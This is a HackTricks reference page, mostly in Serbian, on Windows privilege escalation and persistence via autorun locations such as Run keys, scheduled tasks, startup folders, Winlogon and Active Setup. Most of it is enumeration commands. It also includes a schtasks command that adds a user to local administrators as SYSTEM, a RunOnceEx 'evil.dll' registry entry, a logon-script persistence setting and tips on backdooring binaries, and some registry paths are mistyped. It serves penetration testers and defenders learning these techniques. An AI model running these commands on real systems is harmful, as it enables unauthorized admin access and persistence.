# Eskalacija privilegija pomoću Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** može da se koristi za pokretanje programa pri **startup**. Pogledajte koji su binarni fajlovi programirani da se pokreću pri startup sa:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Zakaženi zadaci

**Tasks** mogu biti zakazani da se izvršavaju sa **određenom učestalošću**. Pogledajte koji su binarni fajlovi zakazani za pokretanje sa:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Folders

Svi binarni fajlovi koji se nalaze u **Startup folders će biti izvršeni pri pokretanju**. Uobičajeni startup folders su oni navedeni u nastavku, ali startup folder je označen u registru. [Pročitaj ovo da naučiš gde.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **FYI**: Archive extraction *path traversal* vulnerabilities (such as the one abused in WinRAR prior to 7.13 – CVE-2025-8088) can be leveraged to **deposit payloads directly inside these Startup folders during decompression**, resulting in code execution on the next user logon.  For a deep-dive into this technique see:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registry

> [!TIP]
> [Note from here](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): The **Wow6432Node** registry entry indicates that you are running a 64-bit Windows version. The operating system uses this key to display a separate view of HKEY_LOCAL_MACHINE\SOFTWARE for 32-bit applications that run on 64-bit Windows versions.

### Runs

**Commonly known** AutoRun registry:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Registry keys known as **Run** and **RunOnce** are designed to automatically execute programs every time a user logs into the system. The command line assigned as a key's data value is limited to 260 characters or less.

**Service runs** (can control automatic startup of services during boot):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

On Windows Vista and later versions, the **Run** and **RunOnce** registry keys are not automatically generated. Entries in these keys can either directly start programs or specify them as dependencies. For instance, to load a DLL file at logon, one could use the **RunOnceEx** registry key along with a "Depend" key. This is demonstrated by adding a registry entry to execute "C:\temp\evil.dll" during the system start-up:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Eksploit 1**: Ako možete da upisujete unutar bilo kog od pomenutih registry unosa u **HKLM**, možete eskalirati privilegije kada se drugi korisnik prijavi.

> [!TIP]
> **Eksploit 2**: Ako možete da prepišete bilo koji od binarnih fajlova navedenih u bilo kom od registry unosa u **HKLM**, možete modifikovati taj binary sa backdoor-om kada se drugi korisnik prijavi i eskalirati privilegije.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Prečice postavljene u **Startup** folder će automatski pokrenuti servise ili aplikacije tokom user logon-a ili system reboot-a. Lokacija **Startup** folder-a je definisana u registry-ju i za opsege **Local Machine** i **Current User**. To znači da će svaka prečica dodata u ove navedene **Startup** lokacije obezbediti da povezani servis ili program krene nakon logon-a ili reboot procesa, što ovo čini jednostavnom metodom za zakazivanje programa da se automatski izvršavaju.

> [!TIP]
> Ako možeš da prepišeš bilo koji \[User] Shell Folder pod **HKLM**, moći ćeš da ga usmeriš na folder kojim upravljaš i da postaviš backdoor koji će se izvršavati svaki put kada se korisnik prijavi na sistem, eskalirajući privilegije.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Ova vrednost registra po korisniku može da pokazuje na skriptu ili komandu koja se izvršava kada se taj korisnik prijavi. To je uglavnom **persistence** mehanizam zato što radi samo u kontekstu pogođenog korisnika, ali i dalje vredi proveriti tokom post-exploitation i autoruns pregleda.

> [!TIP]
> Ako možeš da upišeš ovu vrednost za trenutnog korisnika, možeš ponovo da pokreneš izvršavanje pri sledećem interaktivnom logovanju bez admin prava. Ako možeš da je upišeš za drugi korisnički hive, možeš dobiti code execution kada se taj korisnik prijavi.
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Napomene:

- Preferirajte pune putanje do `.bat`, `.cmd`, `.ps1`, ili drugih launcher fajlova koji su već čitljivi za target korisnika.
- Ovo preživljava logoff/reboot sve dok se vrednost ne ukloni.
- Za razliku od `HKLM\...\Run`, ovo samo po sebi ne daje elevation; to je persistence u user-scope.

### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Tipično, ključ **Userinit** je podešen na **userinit.exe**. Međutim, ako se ovaj ključ izmeni, navedeni executable će takođe biti pokrenut od strane **Winlogon** pri user logon. Slično tome, ključ **Shell** je namenjen da pokazuje na **explorer.exe**, koji je default shell za Windows.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> Ako možete da prepišete registry vrednost ili binary, moći ćete da eskalirate privileges.

### Policy Settings

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Proverite **Run** key.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Promena Safe Mode Command Prompt

U Windows Registry pod `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, postoji vrednost **`AlternateShell`** koja je podrazumevano podešena na `cmd.exe`. To znači da kada tokom startovanja izabereš "Safe Mode with Command Prompt" (pritiskom na F8), koristi se `cmd.exe`. Međutim, moguće je podesiti računar da se automatski pokreće u ovom režimu bez potrebe da pritisneš F8 i ručno ga izabereš.

Koraci za kreiranje boot opcije za automatsko pokretanje u "Safe Mode with Command Prompt":

1. Promeni atribute fajla `boot.ini` da ukloniš read-only, system i hidden zastavice: `attrib c:\boot.ini -r -s -h`
2. Otvori `boot.ini` za uređivanje.
3. Ubaci liniju poput: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Sačuvaj izmene u `boot.ini`.
5. Ponovo primeni originalne atribute fajla: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Promena registra ključa **AlternateShell** omogućava podešavanje prilagođene command shell, što potencijalno može dovesti do neovlašćenog pristupa.
- **Exploit 2 (PATH Write Permissions):** Ako imaš write permissions na bilo koji deo sistemske **PATH** promenljive, posebno pre `C:\Windows\system32`, možeš izvršiti prilagođeni `cmd.exe`, što može biti backdoor ako se sistem pokrene u Safe Mode.
- **Exploit 3 (PATH and boot.ini Write Permissions):** Pristup za pisanje u `boot.ini` omogućava automatsko pokretanje Safe Mode režima, što olakšava neovlašćen pristup pri sledećem reboot.

Da proveriš trenutno podešavanje **AlternateShell**, koristi ove komande:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Installed Component

Active Setup je funkcija u Windows koja **pokreće se pre nego što je desktop okruženje potpuno učitano**. Ona daje prioritet izvršavanju određenih komandi, koje moraju da se završe pre nego što se korisnički logon nastavi. Ovaj proces se dešava čak i pre nego što se pokrenu druge startup stavke, kao što su one u Run ili RunOnce registry odeljcima.

Active Setup se upravlja kroz sledeće registry ključeve:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Unutar ovih ključeva postoje različiti subkeys, od kojih svaki odgovara određenom komponentu. Ključne vrednosti od posebnog interesa uključuju:

- **IsInstalled:**
- `0` označava da se komanda komponente neće izvršiti.
- `1` znači da će se komanda izvršiti jednom za svakog korisnika, što je podrazumevano ponašanje ako vrednost `IsInstalled` nedostaje.
- **StubPath:** Definiše komandu koju Active Setup treba da izvrši. To može biti bilo koja validna command line, kao što je pokretanje `notepad`.

**Security Insights:**

- Izmena ili upis u ključ gde je **`IsInstalled`** postavljen na `"1"` sa određenim **`StubPath`** može dovesti do neovlašćenog izvršavanja komandi, potencijalno za privilege escalation.
- Izmena binarne datoteke na koju pokazuje bilo koja vrednost **`StubPath`** takođe može omogućiti privilege escalation, uz dovoljne dozvole.

Da bi se pregledale konfiguracije **`StubPath`** kroz Active Setup komponente, mogu se koristiti ove komande:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Pregled Browser Helper Objects (BHOs)

Browser Helper Objects (BHOs) su DLL moduli koji dodaju dodatne funkcije Microsoft Internet Explorer-u. Učitavaju se u Internet Explorer i Windows Explorer pri svakom pokretanju. Ipak, njihovo izvršavanje može biti blokirano postavljanjem ključa **NoExplorer** na 1, čime se sprečava njihovo učitavanje sa Windows Explorer instancama.

BHOs su kompatibilni sa Windows 10 preko Internet Explorer 11, ali nisu podržani u Microsoft Edge, podrazumevanom browser-u u novijim verzijama Windows-a.

Da biste pregledali BHOs registrovane na sistemu, možete proveriti sledeće registry ključeve:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Svaki BHO je predstavljen svojim **CLSID** u registry-u, koji služi kao jedinstveni identifikator. Detaljne informacije o svakom CLSID mogu se naći pod `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Za upit BHOs u registry-u, mogu se koristiti sledeće komande:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Extensions

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Napomena da će registry sadržati 1 novi registry po svakoj dll i biće predstavljen pomoću **CLSID**. CLSID informacije možete pronaći u `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Font Drivers

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Open Command

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Opcije izvršenja Image File Execution
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Napomena da su svi sajtovi na kojima možete pronaći autoruns **već pretraženi od strane**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Međutim, za **sveobuhvatniju listu auto-izvršavanih** fajlova možete koristiti [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)iz systinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## More

**Pronađi više Autoruns poput registry-ja u** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

## References

- [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
- [https://attack.mitre.org/techniques/T1037/001/](https://attack.mitre.org/techniques/T1037/001/)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)



{{#include ../../banners/hacktricks-training.md}}
